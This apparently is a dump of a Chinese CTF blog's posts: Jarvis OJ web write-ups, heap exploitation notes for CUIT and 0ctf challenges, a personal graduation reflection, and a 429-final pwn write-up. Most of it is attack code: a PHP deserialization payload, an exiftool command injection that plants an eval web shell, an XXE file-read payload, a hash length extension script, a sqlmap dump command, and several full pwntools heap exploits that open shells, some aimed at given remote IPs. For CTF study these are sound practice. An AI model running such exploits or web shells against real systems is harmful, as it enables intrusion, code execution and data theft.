np.linalg.solve(o,r)print xstring = ''for i in x: string += chr(int(str(i)[0:-2]))print string phpinfo反序列化漏洞，比较新的一点是利用了php upload过程中的session来进行漏洞利用。 html构造如下 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 几个payload print_r(dirname(__FILE__));print_r(scandir(dirname(__FILE__)));print_r(file_get_contents(&quot;Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));序列化payload 123456789101112131415161718192021222324&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$m = new OowoO();$m-&gt;mdzz = &quot;print_r(dirname(__FILE__));&quot;; echo serialize($m);//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;?&gt; ps: 参考资料PHP Session 序列化及反序列化处理器 http://www.tuicool.com/articles/zEfuEz uploadcve漏洞 imagick exiftool -label=&quot;\\&quot;|/usr/bin/id; \\&quot;&quot; imagick.png shell exiftool -label=&quot;\\&quot;|/bin/echo \\&lt;?php \\@eval\\(\\\\$\\_POST\\[a\\]\\)\\;?\\&gt; &gt; /opt/lampp/htdocs/uploads/1.php; \\&quot;&quot; imagick.png CTF{873dfee87823248f4a1657650204697a} api一开始一脸懵比。。。 原来是XXE攻击 payload一发带走 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt; Easy Gallery考点：文件包含漏洞 1、泄露源码 但是关键字符被waf挡住了。 上传图片马 uploads/1497485980.gif 还是被waf拦截了，使用&lt;script&gt;绕过 CTF{upl0ad_sh0uld_n07_b3_a110wed} chopper考察点：12345X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Client-IP: 127.0.0.1 ssrf中ip.src的构建。 信息获取能力 123456789robots.txt.index.php.swp.index.php.swoindex.txtindex.bakindex.php~test.phpindex.phpsphpinfo.php 在robots.txt中找到线索。在burp repeater中，change action method 使get变成post，成功执行。 CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs} flag在管理员手里考察点： 信息获取能力 vim缓存文件恢复 vim -r index.php 哈希长度扩展攻击 可利用工具： https://github.com/iagox86/hash_extender exp如下 123456789101112131415161718192021import requests,os,urllibfor x in range(1000): cmd = './hash_extender -d \";\\\\\"tseug\\\\\":5:s\" -s \"3a4727d57463f122833d9e732f94e4e0\" -a \";\\\\\"nimda\\\\\":5:s\" -f md5 --out-data-format=html -q -l '+str(x) # print cmd p = os.popen(cmd).read() # break url = \"http://web.jarvisoj.com:32778/\" payload = \"__cfduid=d08f46c0f9fbc7e86bab05b2d091bb7c81496549709; UM_distinctid=15c715066e3a8a-0f985be0b8ac06-5393662-1fa400-15c715066e4104b; \" payload += \"hsh=\"+p[:32]+\";\" payload +=\"role=\"+urllib.quote(urllib.unquote(p[32:])[::-1])+\";\" # print payload # break head = &#123;\"Cookie\":payload&#125; data = requests.get(url=url,headers=head).content if len(data) != 210: print data 参考资料： https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90 RE逆向思路。。gdb调试一波，拿到flag。。。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;//动态链接库路径#define LIB_CACULATE_PATH &quot;./udf.so&quot;//函数指针typedef int (*CAC_FUNC)();int main()&#123; void *handle; char *error; CAC_FUNC cac_func = NULL; //打开动态链接库 handle = dlopen(LIB_CACULATE_PATH, RTLD_LAZY); if (!handle) &#123; fprintf(stderr, &quot;%s\\n&quot;, dlerror()); exit(EXIT_FAILURE); &#125; //清除之前存在的错误 dlerror(); //获取一个函数 *(void **) (&amp;cac_func) = dlsym(handle, &quot;getflag&quot;); if ((error = dlerror()) != NULL) &#123; fprintf(stderr, &quot;%s\\n&quot;, error); exit(EXIT_FAILURE); &#125; (*cac_func)(); dlclose(handle); exit(EXIT_SUCCESS);&#125;gcc -rdynamic -o main main.c -ldl simple injectionsqlmap -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --data &quot;username=123&amp;password=123&quot; --tamper=space2comment -D injection --dump","tags":[{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"}]},{"title":"【pwn】cuit2017 & 0ctf2017 heap总结","date":"2017-06-04T15:59:24.000Z","path":"2017/06/04/heap-all/","text":"涉及到的知识点1、fastbin attack 2、unsorted bin attack 3、malloc堆内存管理 一些记录当我们用malloc申请一个0x20的空间的时候，glibc实际上给予了我们一个如下这样子的一个结构。 |head(0x8/0x10)|data(0x20)| 注意：由于x84和x64的机器字长不一样，故其head头部大小也不一样，x86为0x8长度，x64为0x10长度。 data区域是我们可以进行数据输入的区间，malloc返回的指针便是该区间的首地址，记作PTR 当我们free它的时候，它会判定是否与top chunk相邻，如果相邻，它将会与top chunk合并，如果不是的话，它会进一步判断自身大小是否满足fast bin的要求，fastbin的边界大小由 libc内的全局变量fast_max决定，不过x86下这个值为0x40，x64下位0x80，小于等于这个值的所有chunk，free后将有fast bin管理，如果该chunk可以重复free，我们则可以利用fast bin attack来实现有限制的地址写能力（https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c ）。而如果边界的大小大于fastbin的边界大小，该chunk则会加入到unsorted bin中去，此时我们可以修改bk来实现unsorted attack （ https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c ）如果free 一个small/large chunk 的时候，可以修改本chunk、前一个或后一个，small/large chunk的head and data，则可以进行double free攻击。（ http://www.hackdig.com/08/hack-25191.htm ） cuit2017 pwn400题目可以从我github上下载。 hint：ubuntu 16.04 本题利用方式为：fast bin attack 覆盖name变量实现信息泄露。 overlap chunk attack 实现 hijack fsp attack，最终修改vtable至onegadget 或者system 实现get shell。 注意点：x64下面 0x220为vtable偏移量。x86么。。还没测ORZ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-05-27 21:28:47# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import os,timefrom pwn import *context(log_level=\"debug\")DEBUG = 1target = \"./pwn400\"remote_ip = \"119.29.87.226\"port = 50004# rop = roputils.ROP(target)elf = ELF(target)libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)# libc = ELF[target]# msfvenom -p linux/x86/exec CMD=/bin/sh -b \"\\x0b\\x00\" -f python#buf = \"\"# buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"# buf += \"\\x76\\x0e\\x7d\\x30\\x90\\xf9\\x83\\xee\\xfc\\xe2\\xf4\\x17\\x3b\"# buf += \"\\xc8\\x60\\x2f\\x56\\xf8\\xd4\\x1e\\xb9\\x77\\x91\\x52\\x43\\xf8\"# buf += \"\\xf9\\x15\\x1f\\xf2\\x90\\x13\\xb9\\x73\\xab\\x95\\x38\\x90\\xf9\"# buf += \"\\x7d\\x1f\\xf2\\x90\\x13\\x1f\\xe3\\x91\\x7d\\x67\\xc3\\x70\\x9c\"# buf += \"\\xfd\\x10\\xf9\"# int 0x80 linux x86 0x1c# buf = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";# bss = rop.section('.bss')# rop.got('puts')# rop.call('read', 0, addr_bss, 0x100)# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'# def exec_fmt(payload):# p = process(target)# p.recvuntil(\"input:\")# p.sendline(payload)# p.recvuntil(\"input:\")# p.sendline(payload)# return p.recvuntil(\",\")[:-1]# autofmt = FmtStr(exec_fmt)# offset = autofmt.offset# def send_payload(payload):# sl(payload+\"%100000c\")# autofmt = FmtStr(send_payload,offset=offset)# autofmt.write(free_hook_addr,one_gadget_addr)# autofmt.execute_writes()if DEBUG: p = process(target,env=&#123;\"LD_LIBRARY_PATH\":sys.path[0]&#125;) else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)def add(name,sec): ru(\"7.exit\\n==============================\\n\") sl(\"1\") ru(\"\\n\") sd(name) ru(\"\\n\") sd(sec)def edit(sec): ru(\"7.exit\\n==============================\\n\") sl(\"2\") ru(\"\\n\") sd(sec)def dele(): ru(\"7.exit\\n==============================\\n\") sl(\"3\")def show(): ru(\"7.exit\\n==============================\\n\") sl(\"4\")def submit(data1,data2): ru(\"7.exit\\n==============================\\n\") sl(\"5\") ru(\"\\n\") sd(\"Y\") ru(\"\\n\") sd(data1) ru(\"\\n\") sd(data2)def save(size,title,advise): ru(\"7.exit\\n==============================\\n\") sl(\"6\") ru(\"\\n\") sl(str(size)) ru(\"\\n\") sd(title) ru(\"\\n\") sd(advise)#save(0x28,\"a\"*0x28+p64(0x21),\"a\"*0x18)add(\"a\"*8+p64(0x21)+\"\\n\",\"1\\n\")dele()edit(str(0x6020c0).rjust(7,\"0\")+\"\\n\")submit(\"a\"*0x17+\"\\x00\\n\",\"a\"*0x8+p64(elf.got[\"alarm\"])+\"\\n\")##leak (- limit :(ru(\"7.exit\\n==============================\\n\")sl(\"9\")alarm_addr = u64(ru(\",You\")[5:-4].ljust(8,\"\\x00\"))libc_base = alarm_addr-libc.symbols[\"alarm\"]one_gadget = libc_base + 0xf5e40bin_sh = libc_base+next(libc.search('/bin/sh'))system_addr = libc_base+libc.symbols[\"system\"]##hijack fspsave(0x100,\"a\"*0x28+p64(0x110+0x231+0x1010),\"aaa\\n\")ru(\"te on \")addr_1 = int(ru(\")\\n\")[2:-2],16)#gdb.attach(p,\"b*0x040111A\\nc\")payload = 0x1c*p64(system_addr)payload +=\"/\\x80||/////bin/sh\\x00\" #start fsppayload +=0x16*p64(addr_1)+p64(0)+(0x47-0x19)*p64(addr_1)+p64(addr_1)+\"\\n\"save(0x380,p64(system_addr)*4+\"\\n\",payload)p.interactive() 似乎有个可以直接用来算偏移的C源码，妈妈再也不用担心我算不准偏移啦~12345678910111213141516171819202122232425262728293031323334#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt; int main()&#123; FILE *fp; fp=stderr; int chain=&amp;(fp-&gt;_chain); int flags=&amp;(fp-&gt;_flags); int dis=chain-flags; printf(\"FILE struct size: 0x%x\\n\",sizeof(FILE)); printf(\"fp-&gt;chain - fp: 0x%x %x\\n\",dis); int mode=&amp;(fp-&gt;_mode); dis=mode-flags; printf(\"fp-&gt;mode - fp: 0x%x\\n\",dis); int write_ptr=&amp;(fp-&gt;_IO_write_ptr); dis=write_ptr-flags; printf(\"fp-&gt;write_ptr - fp: 0x%x\\n\",dis); int write_base=&amp;(fp-&gt;_IO_write_base); dis=write_base-flags; printf(\"fp-&gt;write_base - fp: 0x%x\\n\",dis); int vtable_offset=&amp;(fp-&gt;_vtable_offset); dis=vtable_offset-flags; printf(\"fp-&gt;vtable_offset - fp: 0x%x\\n\",dis); int read_ptr=&amp;(fp-&gt;_IO_read_ptr); dis=read_ptr-flags; printf(\"fp-&gt;read_ptr - fp: 0x%x\\n\",dis); return 0; 0ctf baby heap这题有两种利用方式，一种是全程使用fastbin attack ，还有一种是既利用fast bin 又利用 unsorted bin attack exp1 如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-05-22 10:39:31# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputils,os,timefrom pwn import *context(log_level=\"debug\",arch=\"x86_64\")DEBUG = 1target = \"./babyheap\"remote_ip = \"\"port = 0rop = roputils.ROP(target)elf = ELF(target)libc = ELF(\"./libc.so.6\")# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)# libc = ELF[target]# msfvenom -p linux/x86/exec CMD=/bin/sh -b \"\\x0b\\x00\" -f python#buf = \"\"# buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"# buf += \"\\x76\\x0e\\x7d\\x30\\x90\\xf9\\x83\\xee\\xfc\\xe2\\xf4\\x17\\x3b\"# buf += \"\\xc8\\x60\\x2f\\x56\\xf8\\xd4\\x1e\\xb9\\x77\\x91\\x52\\x43\\xf8\"# buf += \"\\xf9\\x15\\x1f\\xf2\\x90\\x13\\xb9\\x73\\xab\\x95\\x38\\x90\\xf9\"# buf += \"\\x7d\\x1f\\xf2\\x90\\x13\\x1f\\xe3\\x91\\x7d\\x67\\xc3\\x70\\x9c\"# buf += \"\\xfd\\x10\\xf9\"# int 0x80 linux x86 0x1c# buf = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";# bss = rop.section('.bss')# rop.got('puts')# rop.call('read', 0, addr_bss, 0x100)# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'# def exec_fmt(payload):# p = process(target)# p.recvuntil(\"input:\")# p.sendline(payload)# p.recvuntil(\"input:\")# p.sendline(payload)# return p.recvuntil(\",\")[:-1]# autofmt = FmtStr(exec_fmt)# offset = autofmt.offset# def send_payload(payload):# sl(payload+\"%100000c\")# autofmt = FmtStr(send_payload,offset=offset)# autofmt.write(free_hook_addr,one_gadget_addr)# autofmt.execute_writes()if DEBUG: p = process(target,env=&#123;\"LD_LIBRARY_PATH\":sys.path[0]&#125;) # gdb.attach(p,\"b*main\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)def add(size): ru(\"Command:\") sl(\"1\") ru(\"Size: \") sl(str(size))def fill(index,size,data): ru(\"Command: \") sl(\"2\") ru(\"Index: \") sl(str(index)) ru(\"Size: \") sl(str(size)) ru(\"Content: \") sl(data)def free(index): ru(\"Command: \") sl(\"3\") ru(\"Index: \") sl(str(index))def dump(index): ru(\"Command: \") sl(\"4\") ru(\"Index: \") sl(str(index))add(0x20) #index0add(0x1e0) #index1add(0x200) #index2add(0x200) #index3free(1) #free index1payload = \"a\"*0x28+\"\\x30\"fill(0,len(payload),payload)add(0x80) #index1add(0x60) #index4free(1) #free 1free(2) #free 2add(0x80) #index1dump(4)ru(\"\\n\")libc_bin_addr = u64(p.recv(8))# bin_offset = 0x3a5678one_gadget_offset = 0x4425alocal_bin_offset = 0x3C4C58libc_base = libc_bin_addr - local_bin_offsetlibc.address = libc_baseone_gadget_addr = one_gadget_offset+libc_basemalloc_offset = 0x3C4BD0malloc_addr = malloc_offset + libc_base#change index 4 metapayload = flat(\"a\"*0x80,0x90,0x70)fill(1,len(payload),payload)free(4)payload = flat(\"a\"*0x80,0x90,0x70,libc.symbols['__malloc_hook']-0x23)print hex(libc.symbols['__malloc_hook']-0x23)fill(1,len(payload),payload)add(0x60) #2add(0x60) #4payload = flat(\"\\x00\"*19,one_gadget_addr)fill(4,len(payload),payload)raw_input()add(0x90)print \"libc_bin_addr=\"+hex(libc_bin_addr)print \"libc_base=\"+hex(libc_base)print \"one_gadget_addr=\"+hex(one_gadget_addr)print \"malloc_addr=\"+hex(malloc_addr)p.interactive() exp2 如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164#!/usr/bin/env pythonfrom pwn import *import syscontext(log_level = \"debug\")def alloc(size): r.sendline('1') r.sendlineafter(': ', str(size)) r.recvuntil(': ', timeout=1)def fill(idx, data): r.sendline('2') r.sendlineafter(': ', str(idx)) r.sendlineafter(': ', str(len(data))) r.sendafter(': ', data) r.recvuntil(': ')def free(idx): r.sendline('3') r.sendlineafter(': ', str(idx)) r.recvuntil(': ')def dump(idx): r.sendline('4') r.sendlineafter(': ', str(idx)) r.recvuntil(': \\n') data = r.recvline() r.recvuntil(': ') return datadef exploit(r): libc = ELF(\"./libc-2.19.so\") r.recvuntil(': ') alloc(0x20) alloc(0x20) alloc(0x20) alloc(0x20) alloc(0x50)#4 alloc(0x50)#5 alloc(0x50)#6 free(1) free(2)# over lap payload = p64(0)*5 payload += p64(0x31) payload += p64(0)*5 payload += p64(0x31) payload += p8(0xc0) fill(0, payload) payload = p64(0)*5 payload += p64(0x31) fill(3, payload) alloc(0x20) #1 alloc(0x20) #2# leak heap free(5) payload = p64(0)*5 payload += p64(0x61) fill(3, payload) free(4) heap_addr = u64(dump(2)[:8]) - 0x120 print \"heap_addr = \"+hex(heap_addr) alloc(0x50) alloc(0x50)# leak libc payload = p64(0)*5 payload += p64(0xc1) fill(3, payload) #raw_input() # alloc(0x50) free(4) # dump(2) main_area = u64(dump(2)[:8]) libc_base = main_area - 0x3a5678 libc.address = libc_base alloc(0x50)#4 alloc(0x58)#7 alloc(0x30)#8 alloc(0x20)#9 alloc(0x20)#10 alloc(0x58) payload = p64(0)*5+p64(0x61+0x60) fill(3, payload) free(4) fill(5,\"\\x00\"*(0x50)+p64(0)+p64(0x61+0x60+0x40)) free(6) alloc(0x58) #4 log.info(\"libc_base: \" + hex(libc_base)) # print \"b*\"+hex(0x7CE9A+libc_base) # print util.proc.pidof(r) # raw_input() # unsorted bin attack payload = \"\\x00\"*0x50+p64(0)+p64(0xd1)+p64(main_area)+p64(libc_base+0x3A6040-0x10) payload = payload.ljust(0x100-0x50,\"\\x00\") data = \"/bin/sh\\x00\"+p64(0x101) data += p64(0)+p64(0) data += p64(0)+p64(1) data = data.ljust(0xc0,\"\\x00\") data += p64(0xffffffffffffffff) data = data.ljust(0xd8,\"\\x00\") data += p64(heap_addr+0x30*4+0x10+len(payload+data)-0x18+8) data += p64(libc.symbols[\"system\"]) fill(4,payload+data) alloc(0x58) # dump(2) # raw_input() # raw_input() # fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10)) # print \"IO_LIST=\"+hex(libc_base+0x3C5600) # alloc(0x58)#4 # alloc(0x20)#7 # alloc(0x20)#8 # free(4) # fill(3,p64(0)*5+p64(0x71)) # fill(2, p64(libc.symbols['__malloc_hook']-0x23)) # raw_input() # alloc(0x58)#9 # alloc(0x58) # alloc(0x30)#10 # raw_input() # payload = '\\x00'*3 # payload += p64(0)*2 # payload += p64(libc_base + 0x41374) # fill(6, payload) # alloc(255) r.interactive()if __name__ == \"__main__\": log.info(\"For remote: %s HOST PORT\" % sys.argv[0]) if len(sys.argv) &gt; 1: r = remote(sys.argv[1], int(sys.argv[2])) exploit(r) else: r = process(['./fastbin'], env=&#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) exploit(r) 参考资料http://www.freebuf.com/articles/system/104144.html （Linux堆内存管理深入分析（上））http://www.freebuf.com/articles/security-management/105285.html （Linux堆内存管理深入分析（下）） http://www.freebuf.com/news/88660.html （浅析Linux堆溢出之fastbin） http://www.cnblogs.com/shangye/p/6268981.html （ house of orange ） http://www.bitscn.com/network/hack/200607/30235.html （ FSO 利用 ）","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"https://winter3un.github.io/tags/heap/"}]},{"title":"墨色的五月","date":"2017-06-03T15:20:53.000Z","path":"2017/06/03/墨色的五月/","text":"前言又是很久没更新博客了，毕竟我比较懒 = =。。。 这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。 最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。 比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。 总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。 1、 加强数据流量分析能力（应对铁人三项，参考科赛 2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习 一直以来喜欢低调，喜静，喜欢自己默默做自己的事情，可能与我自身性格有关吧。今后也同样如此，沉心静气。 5月的碎碎念大学四年的最后一个月了，今后就要步入职场，而我基本上也完成了我进这所学院时的初衷，在这所大学建立一个安全团队，为对安全技术有兴趣的人提供一个平台（当然这些事，我一个人肯定是完成不了的，多亏了斯进老师一直以来的支持，最想感谢的人就是她啦）。大学这四年谈过一次恋爱，虽然短短3个月，不过至少这门必修课给我个及格分吧ORZ。做过一些科研，虽然很难去坚持做（毕竟懒癌晚期患者，没救了）。拿过一些比赛的最高名次，其实CTF比赛不难的，心态和运气才是关键（hhhhhhhh），接下来也要做一些ctf比赛的总结了（我竟然从没做过ORZ 。 说实话这个月在临安不用集合真的是太爽了= =。。。 也是到了该离开的时候了，团队已经带起来了，师弟们的实力都很棒（团队里都是男生，我也很绝望啊，期待有个对网络安全感兴趣的女生加入吧，女黑客ORZ）。今后的话，会一直对二进制进行研究，这是我的强项，虽然工作上可能web为主吧，不过无所谓了。 一些未更新的wp1、cuit writeup （看下web题 2、0ctf writeup 3、堆溢出的总结 一些计划1、刷完pwnable 2、刷完最近的web赛题 3、深入web代码审计","tags":[{"name":"note","slug":"note","permalink":"https://winter3un.github.io/tags/note/"}]},{"title":"【pwn】2017-429final","date":"2017-04-28T06:24:59.000Z","path":"2017/04/27/2017-429-final/","text":"前言下次pwn选手真的不该去429线下。。这BGM神TM的= =。。 比赛很稳，主队拿了第7，分队第12，不过需要反思的是： 1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势） 2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。 3、写好的exp脚本交由负责流量审计的队友来维护 4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。 5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag 6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。 7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手 8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ 进入主题吧 pwn2第一个开放的题目是pwn2，9点开放的比赛，我在10点10分左右已经将具体利用思路构思完毕（静态分析30分钟+动态分析40分钟），坑爹的是对libc文件进行分析的时候（因为我需要拿到free_hook的地址），IDA无法静态分析，这边消耗了两个小时，写完exp的时候已经是领盒饭12点了。。别人利用这个pwn2已经打了至少18轮，900分。。 pwn2是一个具有off by one和常规溢出漏洞的二进制程序，他创建的虚表结构如下 PTR[0]|(Long int)hashcode Length|(char )Name|(char )Hash code| PTR[1]|(Long int)hashcode Length|(char )Name|(char )Hash code| 回过头我们看下这个二进制程序 Hashcode 的input函数123456789101112131415__int64 __fastcall sub_4009DB(__int64 a1, int a2)&#123; char v3; // [sp+1Bh] [bp-5h]@2 unsigned int i; // [sp+1Ch] [bp-4h]@1 for ( i = 0; ; ++i ) &#123; v3 = getchar(); if ( i == a2 ) break; *(_BYTE *)(a1 + (signed int)i) = v3; &#125; *(_BYTE *)((signed int)i + a1) = 0; return i;&#125; 记得大一教我C语言的老师说过，C下标的索引是从0开始的,所以a[len(a)]=0 这样的形式会造成1个\\x00字节越界赋值。正常来说，这样1个\\x00字节，最多覆盖下一个虚表结构的preg_size的结构，但是存在另一个溢出漏洞，我们可以将hashcode的长度可输入长度进行修改（注意，hashcode的可输入区域长度没有变化），这便造成了越界溢出，溢出的数据覆盖到了下一个ptr虚表，利用过程如下（这个利用过程其实没有用到off by one）。 以下版本没有用off by one 漏洞 1、创建四个0x20的hashcode 2、修改ptr[0]的hacode length 0x20至0x40 3、覆盖ptr[1]表项，复写ptr[1]表项的hashcode length至我们可以复写ptr[2]表项指向hashcode的指针，复写name指针，利用其我们可以泄露出libc地址。 4、list出所有ptr表项，得到libc地址 5、复写下下一个ptr表项指向hashcode指针，使其指向libc bss段上的free_hook，然后调用edit hashcode，修改 free_hook使其指向system ^以上的供读者自己实现，哈哈哈哈哈哈，我用的是比较麻烦的一个版本 用到off by one 的版本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-26 18:28:36# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputils,timeimport threadingfrom pwn import *context(log_level=\"debug\")DEBUG = 1target = \"./pwn2\"remote_ip = \"172.16.5.22\"port = 5009rop = roputils.ROP(target)# bss = rop.section('.bss')# rop.got('puts')# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'elf = ELF(\"./libc.so.6\")if DEBUG: p = process(target) gdb.attach(p,\"b*0x400C73\\nc\") # gdb.attach(p,\"b*0x400EF4\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)## stage 1 add hashcode 0x20 id 0ru(\"option:\\n\")sl(\"1\")ru(\"\\n\")sl(\"md5\")ru(\"\\n\")sl(\"aaa\")ru(\"t hashcode\\n\")sl(\"a\"*0x20)## stage 2 add hashcode 0x20 id 1ru(\"option:\\n\")sl(\"1\")ru(\"\\n\")sl(\"md5\")ru(\"\\n\")sl(\"aaa\")ru(\"t hashcode\\n\")sl(\"a\"*0x20)## end add hashcode 0x20 id 2ru(\"option:\\n\")sl(\"1\")ru(\"\\n\")sl(\"md5\")ru(\"\\n\")sl(\"/bin/sh\\x00\")ru(\"t hashcode\\n\")sl(\"a\"*0x20)## stage 3 change hashcode length id 0ru(\"option:\\n\")sl(\"3\")ru(\"\\n\")sl(\"0\")ru(\"option:\\n\")sl(\"1\")ru(\" hash type\\n\")sl(\"sha256\") #change length 0x20 to 0x40## stage 4 edit hashcoderu(\"option:\\n\")sl(\"3\")ru(\"\\n\")sl(\"0\")ru(\"option:\\n\")sl(\"3\")ru(\"hcode\\n\")payload = \"a\"*0x20payload += p64(0)+p64(21)+p64(0x20-1)+p64(0)sl(payload)## stage 5 edit chunk id 0ru(\"option:\\n\")sl(\"3\")ru(\"\\n\")sl(\"1\")ru(\"option:\\n\")sl(\"3\")ru(\"hcode\\n\")payload = p64(0)+p64(21)+p64(0x20)+p64(rop.got('puts'))[:-1]sl(payload)## stage 6 leak system addr ru(\"option:\\n\")sl(\"4\")ru(\"\\n\")sl(\"md5\")ru(\"input pattern\\n\")sl(\"a\"*0x20)ru(\"name=\")puts_addr = u64(ru(\"\\nhashcode\")[:5].ljust(8,\"\\x00\"))print \"puts_addr=\"+hex(puts_addr)system_addr = puts_addr-(elf.symbols[\"puts\"]-elf.symbols[\"system\"])print \"system_addr=\"+hex(system_addr)free_hook_addr = puts_addr+(0x00000035f79906e8 - elf.symbols[\"puts\"])print \"free_hook_addr=\"+hex(free_hook_addr)## edit atoi to system## stage 7 edit chunk id 0ru(\"option:\\n\")sl(\"3\")ru(\"\\n\")sl(\"1\")ru(\"option:\\n\")sl(\"3\")ru(\"hcode\\n\")payload = p64(0)+p64(21)+p64(0x48-1)+p64(rop.got('puts'))[:-1]sl(payload)## stage 8 edit chunk id 1ru(\"option:\\n\")sl(\"3\")ru(\"\\n\")sl(\"0\")ru(\"option:\\n\")sl(\"3\")ru(\"hcode\\n\")payload = \"a\"*0x20payload += p64(0)+p64(21)+p64(0x8-1)+p64(0)+p64(free_hook_addr)[:-1]sl(payload)## stage 9 edit free_hook to systemru(\"option:\\n\")sl(\"3\")ru(\"\\n\")sl(\"1\")ru(\"option:\\n\")sl(\"3\")ru(\"hcode\\n\")sl(p64(system_addr)[:-1])# stage 10 systemru(\"option:\\n\")sl(\"2\")ru(\"\\n\")sl(\"2\")p.interacive() pwn1该pwn程序存在两个漏洞，一个是格式化字符串漏洞，一个是栈溢出漏洞，我们可以利用格式化字符串漏洞泄露libc地址，然后利用栈溢出漏洞，构造ropchain，实现shell的获取。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-26 21:39:25# @Author : WinterSun (511683586@qq.com)# @Link : 